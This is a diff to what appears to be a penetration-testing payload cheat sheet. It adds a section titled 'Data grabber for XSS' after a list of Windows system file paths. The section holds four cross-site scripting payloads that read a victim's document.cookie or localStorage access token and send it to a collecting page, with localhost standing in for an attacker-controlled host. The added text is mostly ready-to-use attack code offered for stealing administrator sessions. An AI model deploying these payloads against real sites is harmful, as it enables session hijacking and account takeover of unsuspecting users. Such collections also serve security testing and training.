@@ -218,3 +218,22 @@ FreeBSD -> /var/log/httpd-access.log
 /windows/system32/license.rtf
 /windows/system32/eula.txt
 ```
+
+____
+
+
+### XSS > <a name="data_grabber_xss"></a>Data grabber for XSS
+###### Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
+```html
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
+<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
+<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
+```
+
+* #### [XSS in HTML/Applications](#xss_in_app)
+  * ##### [Basic Payload](#basic_payload)
+  * ##### [Img tag payload](#img_tag_payload)
+* #### [XSS in Markdown](#xss_in_markdown)
+* #### [XSS in SVG](#xss_in_svg)
+* #### [Bypass word blacklist with code evaluation](#bypass_word_blacklist_with_code_evaluation)
